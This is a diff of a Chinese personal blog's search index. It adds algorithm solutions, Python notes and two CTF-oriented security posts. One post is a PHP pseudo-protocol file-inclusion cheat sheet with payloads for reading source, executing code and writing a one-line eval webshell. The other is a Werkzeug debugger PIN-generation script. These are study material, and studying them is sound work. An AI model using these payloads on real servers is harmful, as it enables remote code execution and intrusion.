-        <tag>动态规划</tag>
-        <tag>背包问题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>过河卒</title>
-    <url>/2023/04/26/%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
-    <content><![CDATA[<pre><code class="cpp">#include&lt;iostream&gt;
-#include&lt;vector&gt;
-
-using namespace std;
-
-long long int isvalid(int x, int y, vector&lt;vector&lt;long long int&gt;&gt; map) &#123;
-    if (map[x][y] == -1) return 0;
-    else return map[x][y];
-&#125;
-int main() &#123;
-    int x1, y1, x2, y2;
-    cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;
-    vector&lt;vector&lt;long long int&gt;&gt; map(x1 + 1, vector&lt;long long int&gt;(y1 + 1,0));
-
-    map[x2][y2] = -1;
-    int dx[] = &#123;1, 2, 2, 1, -1, -2, -2, -1&#125;;
-    int dy[] = &#123;-2, -1, 1, 2, 2, 1, -1, -2&#125;;
-    for (int i = 0; i &lt; 8; ++i) &#123;
-        int nx = x2 + dx[i];
-        int ny = y2 + dy[i];
-        if (nx &gt;= 0 &amp;&amp; nx &lt;= x1 &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt;= y1) &#123;
-            map[nx][ny] = -1;
-        &#125;
-    &#125;
-
-    for (int i = 1; i &lt;= x1; ++i) &#123;
-        if(map[i][0]!=-1)map[i][0] = 1;
-        else break;
-    &#125;
-    for (int i = 1; i &lt;= y1; ++i) &#123;
-        if(map[0][i]!=-1)map[0][i] = 1;
-        else break;
-    &#125;
-
-    for (int i = 1; i &lt;= x1; ++i) &#123;
-        for (int j = 1; j &lt;= y1; ++j) &#123;
-            if (map[i][j] != -1) &#123;
-                map[i][j] = isvalid(i - 1, j, map) + isvalid(i, j - 1, map);
-            &#125;
-        &#125;
-    &#125;
-    
-    cout&lt;&lt;map[x1][y1];
-    
-&#125;
-</code></pre>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
       </tags>
   </entry>
   <entry>
@@ -1351,6 +837,520 @@ curl -X POST https://www.example.com
       </categories>
       <tags>
         <tag>curl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/04/12/htmllearing/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python</title>
+    <url>/2023/04/21/python/</url>
+    <content><![CDATA[<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash">  astr=&quot;python&quot;      //[起始：结束（不包含）：步长]
+  print(astr[0:2])   //py 
+  print(astr[-1])
+  print(astr[::-1])
+</code></pre>
+<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code class="bash">  alist=[&quot;tom&quot;,&quot;jerry&quot;] //可以写入不同类型的数据
+  alist[0]
+  if name in alist :
+      print(&quot;Yes&quot;);
+</code></pre>
+<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code class="bash">  atuple=(&quot;tom&quot;,&quot;jerry&quot;) 
+</code></pre>
+<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code class="bash">  userdict=&#123;&quot;tom&quot;:&quot;123&quot;,&quot;jerry&quot;:&quot;456&quot;&#125;//字典没有索引值 键值对来取值
+  if name in userdict and password==userdict[username]:
+      print(&quot;Yes&quot;)
+</code></pre>
+<h3 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h3><blockquote>
+<p>f&#x3D;open(“路径”,”#”)    &#x2F;&#x2F;#&#x3D;rb···</p>
+</blockquote>
+<ul>
+<li><code>close()</code> - 关闭文件，释放相关的系统资源</li>
+<li><code>read(size=-1)</code> - 从文件中读取指定字节数的数据，如果未指定 size 或 size 为负数，则读取整个文件</li>
+<li><code>readline(size=-1)</code> - 从文件中读取一行数据，可以指定最大读取字节数</li>
+<li><code>readlines(hint=-1)</code> - 从文件中读取所有行，并返回一个包含所有行的列表，可以指定最大读取字节数</li>
+<li><code>write(text)</code> - 将指定的文本写入文件</li>
+<li><code>writelines(lines)</code> - 向文件中写入一个字符串列表，不添加行分隔符</li>
+<li><code>seek(offset[, whence])</code> - 改变文件指针的位置，offset 表示相对于 whence 的偏移量，whence 可选值：0（文件开头，默认），1（当前位置），2（文件末尾）</li>
+<li><code>tell()</code> - 返回文件指针的当前位置，相对于文件开头</li>
+<li><code>flush()</code> - 将文件缓冲区的内容写入文件，并清空缓冲区</li>
+<li><code>fileno()</code> - 返回文件的文件描述符（整数）</li>
+<li><code>isatty()</code> - 检查文件是否为终端设备（例如控制台、终端窗口等）</li>
+<li><code>truncate(size=None)</code> - 裁剪文件到指定大小，如果未指定 size，则裁剪到当前文件指针位置</li>
+</ul>
+<h3 id="模块和函数"><a href="#模块和函数" class="headerlink" title="模块和函数"></a>模块和函数</h3><pre><code class="python">    &quot;&quot;&quot;
+    模块作用
+    包含功能
+    other
+    &quot;&quot;&quot;
+    # 变量类型 作用
+    def name():
+        #函数作用 
+        return 
+
+
+    #主程序中：
+    import name
+</code></pre>
+<h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><pre><code class="python">    try:
+        action
+    except errimfomation:
+        explaination
+    except ···：
+        more 
+</code></pre>
+<h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>a example:</p>
+<pre><code class="python">class SKB(object):
+    color = &quot;green&quot;
+    hands = 2
+    def __init__(self,COLOR,HANDS):
+        #初始化
+        self.color=COLOR
+        self.hands=HANDS
+    def dahulu(self):
+        print(&quot;轰······&quot;)
+        #  &quot;number%d&quot; %(number)
+    def jiaobian(self):
+        print(&quot;我没有&quot;)
+    def myaihao(self):
+        print(&quot;傻逼SKB&quot;)
+
+mysheyou = SKB(&quot;green&quot;,2)
+mysheyou.dahulu()
+mysheyou.myaihao()
+mysheyou.jiaobian()
+</code></pre>
+<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="python获取代码"><a href="#python获取代码" class="headerlink" title="python获取代码"></a>python获取代码</h4><pre><code class="python">import urllib.request  
+
+class GetHtml(object):
+    def __init__(self, URL,HEAD):  
+        self.url = URL
+        self.head=HEAD
+
+    def get_index(self):
+        self.request = urllib.request.Request(self.url)
+        self.request.add_header(&quot;user-agent&quot;,self.head)
+        self.response=urllib.request.urlopen(self.request)
+        return self.response.read()
+
+html = GetHtml(&quot;https://siren.blue&quot;,&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;)
+print(html.get_index()) 
+</code></pre>
+<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><pre><code class="python">#re模块
+&quot;&quot;&quot;
+.       单个字符匹配
+[]      括号内的内容会被逐一匹配
+\d      匹配单个数字
+\w      [0-9a-zA-Z]
+\s      空白字符 空格 tab
+*       匹配左邻字符出现0次或多次
++       左邻字符出现一次或多次
+?       左邻字符出现一次或0次
+&#123;n,m&#125;   左邻字符出现n 到 m次
+^       以什么字符串开头
+$       以什么字符串结尾
+()\\1   括号内保存 分组保存
+&quot;&quot;&quot;
+re.findall(&quot;.x&quot;,&quot;&quot;)
+re.findall(&quot;[Gf]ood&quot;,&quot;&quot;)
+re.findall(&quot;hello&quot;,&quot;&quot;)# 直接匹配
+re.findall(&quot;Good｜food&quot;,&quot;&quot;)
+re.findall(&quot;go*gle&quot;,&quot;i like google not ggle goooogle and gogle&quot;)
+re.findall(&quot;go+gle&quot;,&quot;&quot;)
+re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
+</code></pre>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pythonlist</title>
+    <url>/2023/04/21/pythonlist/</url>
+    <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
+<li><code>capitalize()</code> - 将字符串的第一个字符大写，其余字符小写</li>
+<li><code>casefold()</code> - 返回一个区分大小写的等效字符串</li>
+<li><code>center(width[, fillchar])</code> - 将字符串居中，使用指定字符填充两侧</li>
+<li><code>count(sub[, start[, end]])</code> - 计算子字符串在字符串中出现的次数</li>
+<li><code>encode(encoding=&#39;utf-8&#39;, errors=&#39;strict&#39;)</code> - 对字符串进行编码</li>
+<li><code>endswith(suffix[, start[, end]])</code> - 检查字符串是否以给定的子字符串结尾</li>
+<li><code>expandtabs(tabsize=8)</code> - 将字符串中的制表符替换为指定数量的空格</li>
+<li><code>find(sub[, start[, end]])</code> - 查找子字符串在字符串中首次出现的位置，如果未找到则返回 -1</li>
+<li><code>format(*args, **kwargs)</code> - 使用指定值替换字符串中的占位符</li>
+<li><code>format_map(mapping)</code> - 使用字典替换字符串中的占位符</li>
+<li><code>index(sub[, start[, end]])</code> - 类似于 find()，但如果未找到子字符串，会引发 ValueError</li>
+<li><code>isalnum()</code> - 检查字符串是否只包含字母和数字</li>
+<li><code>isalpha()</code> - 检查字符串是否只包含字母</li>
+<li><code>isascii()</code> - 检查字符串是否只包含 ASCII 字符</li>
+<li><code>isdecimal()</code> - 检查字符串是否只包含十进制数字</li>
+<li><code>isdigit()</code> - 检查字符串是否只包含数字字符</li>
+<li><code>isidentifier()</code> - 检查字符串是否是有效的 Python 标识符</li>
+<li><code>islower()</code> - 检查字符串中的字母是否都是小写</li>
+<li><code>isnumeric()</code> - 检查字符串是否只包含数值字符</li>
+<li><code>isprintable()</code> - 检查字符串是否只包含可打印字符</li>
+<li><code>isspace()</code> - 检查字符串是否只包含空白字符</li>
+<li><code>istitle()</code> - 检查字符串是否为标题格式（每个单词首字母大写，其余字母小写）</li>
+<li><code>isupper()</code> - 检查字符串中的字母是否都是大写</li>
+<li><code>join(iterable)</code> - 使用字符串作为连接符，将可迭代对象中的元素连接成一个新字符串</li>
+<li><code>ljust(width[, fillchar])</code> - 返回一个左对齐的字符串，并使用指定字符填充右侧</li>
+<li><code>lower()</code> - 将字符串中的所有字符转换为小写</li>
+<li><code>lstrip([chars])</code> - 移除字符串左侧的空白字符或指定字符</li>
+<li><code>maketrans(x[, y[, z]])</code> - 为字符串的 translate() 方法生成一个映射表</li>
+<li><code>partition(sep)</code> - 将字符串分割为一个 3 元组 (head, sep, tail)，head 是分隔符前的子串，sep 是分隔符本身，tail 是分隔符后的子串</li>
+<li><code>replace(old, new[, count])</code> - 将字符串中的 <code>old</code> 替换为 <code>new</code>，可指定替换次数</li>
+<li><code>rfind(sub[, start[, end]])</code> - 查找子字符串在字符串中最后一次出现的位置，如果未找到则返回 -1</li>
+<li><code>rindex(sub[, start[, end]])</code> - 类似于 rfind()，但如果未找到子字符串，会引发 ValueError</li>
+<li><code>rjust(width[, fillchar])</code> - 返回一个右对齐的字符串，并使用指定字符填充左侧</li>
+<li><code>rpartition(sep)</code> - 从右侧开始将字符串分割为一个 3 元组 (head, sep, tail)</li>
+<li><code>rsplit(sep=None, maxsplit=-1)</code> - 从右侧开始使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
+<li><code>rstrip([chars])</code> - 移除字符串右侧的空白字符或指定字符</li>
+<li><code>split(sep=None, maxsplit=-1)</code> - 使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
+<li><code>splitlines([keepends])</code> - 将字符串按行拆分为一个列表，可选择是否保留换行符</li>
+<li><code>startswith(prefix[, start[, end]])</code> - 检查字符串是否以给定的子字符串开头</li>
+<li><code>strip([chars])</code> - 移除字符串两端的空白字符或指定字符</li>
+<li><code>swapcase()</code> - 将字符串中的大小写字母互换</li>
+<li><code>title()</code> - 将字符串中的每个单词的首字母大写，其余字母小写</li>
+<li><code>translate(table)</code> - 使用指定的映射表替换字符串中的字符</li>
+<li><code>upper()</code> - 将字符串中的所有字符转换为大写</li>
+<li><code>zfill(width)</code> - 用零填充字符串的左侧，使其达到指定宽度</li>
+</ul>
+<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><ul>
+<li><code>count(value)</code> - 计算指定值在元组中出现的次数</li>
+<li><code>index(value[, start[, end]])</code> - 返回指定值在元组中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
+</ul>
+<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul>
+<li><code>append(item)</code> - 在列表末尾添加一个元素</li>
+<li><code>extend(iterable)</code> - 将一个可迭代对象的元素添加到列表末尾</li>
+<li><code>insert(index, item)</code> - 在指定索引处插入一个元素</li>
+<li><code>remove(value)</code> - 移除列表中首次出现的指定值，如果未找到则抛出 ValueError</li>
+<li><code>pop([index])</code> - 移除并返回指定索引处的元素，默认移除并返回列表最后一个元素</li>
+<li><code>clear()</code> - 移除列表中的所有元素</li>
+<li><code>index(value[, start[, end]])</code> - 返回指定值在列表中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
+<li><code>count(value)</code> - 计算指定值在列表中出现的次数</li>
+<li><code>sort(key=None, reverse=False)</code> - 对列表元素进行排序，可指定排序键和排序顺序</li>
+<li><code>reverse()</code> - 反转列表中的元素顺序</li>
+<li><code>copy()</code> - 返回列表的一个浅拷贝</li>
+</ul>
+<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul>
+<li><code>clear()</code> - 移除字典中的所有元素</li>
+<li><code>copy()</code> - 返回字典的一个浅拷贝</li>
+<li><code>get(key[, default])</code> - 返回字典中指定键的值，如果键不存在，则返回默认值（默认为 None）</li>
+<li><code>items()</code> - 返回一个包含字典所有键值对的视图对象</li>
+<li><code>keys()</code> - 返回一个包含字典所有键的视图对象</li>
+<li><code>values()</code> - 返回一个包含字典所有值的视图对象</li>
+<li><code>pop(key[, default])</code> - 移除并返回字典中指定键的值，如果键不存在，返回默认值（若未提供默认值，抛出 KeyError）</li>
+<li><code>popitem()</code> - 移除并返回字典中的一个键值对（从 Python 3.7 开始，为最后一个键值对），如果字典为空，抛出 KeyError</li>
+<li><code>setdefault(key[, default])</code> - 如果键不存在于字典中，则添加键并设置其值为默认值（默认为 None），返回该键对应的值</li>
+<li><code>update([other])</code> - 将一个字典（或其他可迭代映射类型）的键值对添加到当前字典中，若有重复的键，则覆盖原有键值对</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>伪协议</title>
+    <url>/2023/05/12/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
+<pre><code class="bash">/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
+</code></pre>
+<p>示例：</p>
+<ul>
+<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
+<ul>
+<li>[文件的相对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
+<ul>
+<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>作用</p>
+<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
+php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
+php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
+php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
+php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
+</code></pre>
+<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
+<ul>
+<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
+<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
+<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
+<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<p>可用的过滤器列表（4类）</p>
+<ul>
+<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
+<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
+<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
+<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
+</ul>
+<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
+<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
+<p><code>php://input + [POST DATA]执行php代码</code></p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php phpinfo(); ?&gt;
+图片描述
+</code></pre>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
+</code></pre>
+<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
+<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
+<p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
+<p><code>compress.zlib://file.gz</code></p>
+<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
+<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
+<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
+<pre><code class="bash">data://text/plain,
+
+http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+
+or
+
+data://text/plain;base64,
+
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
+<pre><code class="bash">http://example.com
+http://example.com/file.php?var1=val1&amp;var2=val2
+http://user:password@example.com
+https://example.com
+https://example.com/file.php?var1=val1&amp;var2=val2
+https://user:password@example.com
+</code></pre>
+<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
+<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
+<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pin</title>
+    <url>/2023/05/13/pin/</url>
+    <content><![CDATA[<pre><code class="python">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;root&#39;,# username
+    &#39;flask.app&#39;,# modname
+    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+    &#39;/usr/local/lib/python3.11/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
+]
+
+private_bits = [
+    &#39;2485376909614&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
+    &#39;003aa46d-e7cb-4f22-8461-4774c3ccf885&#39;# get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&quot;utf-8&quot;)
+    h.update(bit)
+h.update(b&quot;cookiesalt&quot;)
+
+cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;
+
+# If we need to generate a pin we salt it a bit more so that we don&#39;t
+# end up with the same value and generate out 9 digits
+num = None
+if num is None:
+    h.update(b&quot;pinsalt&quot;)
+    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]
+
+# Format the pincode in groups of digits for easier remembering if
+# we don&#39;t have a result yet.
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &quot;-&quot;.join(
+                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
+                for x in range(0, len(num), group_size)
+            )
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>动态规划(一)</title>
+    <url>/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/</url>
+    <content><![CDATA[<blockquote>
+<p>注：本文思路来源于左程云老师</p>
+</blockquote>
+<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2>]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>过河卒</title>
+    <url>/2023/04/26/%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
+    <content><![CDATA[<pre><code class="cpp">#include&lt;iostream&gt;
+#include&lt;vector&gt;
+
+using namespace std;
+
+long long int isvalid(int x, int y, vector&lt;vector&lt;long long int&gt;&gt; map) &#123;
+    if (map[x][y] == -1) return 0;
+    else return map[x][y];
+&#125;
+int main() &#123;
+    int x1, y1, x2, y2;
+    cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;
+    vector&lt;vector&lt;long long int&gt;&gt; map(x1 + 1, vector&lt;long long int&gt;(y1 + 1,0));
+
+    map[x2][y2] = -1;
+    int dx[] = &#123;1, 2, 2, 1, -1, -2, -2, -1&#125;;
+    int dy[] = &#123;-2, -1, 1, 2, 2, 1, -1, -2&#125;;
+    for (int i = 0; i &lt; 8; ++i) &#123;
+        int nx = x2 + dx[i];
+        int ny = y2 + dy[i];
+        if (nx &gt;= 0 &amp;&amp; nx &lt;= x1 &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt;= y1) &#123;
+            map[nx][ny] = -1;
+        &#125;
+    &#125;
+
+    for (int i = 1; i &lt;= x1; ++i) &#123;
+        if(map[i][0]!=-1)map[i][0] = 1;
+        else break;
+    &#125;
+    for (int i = 1; i &lt;= y1; ++i) &#123;
+        if(map[0][i]!=-1)map[0][i] = 1;
+        else break;
+    &#125;
+
+    for (int i = 1; i &lt;= x1; ++i) &#123;
+        for (int j = 1; j &lt;= y1; ++j) &#123;
+            if (map[i][j] != -1) &#123;
+                map[i][j] = isvalid(i - 1, j, map) + isvalid(i, j - 1, map);
+            &#125;
+        &#125;
+    &#125;
+    
+    cout&lt;&lt;map[x1][y1];
+    
+&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>洛谷p1616</title>
+    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
+    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
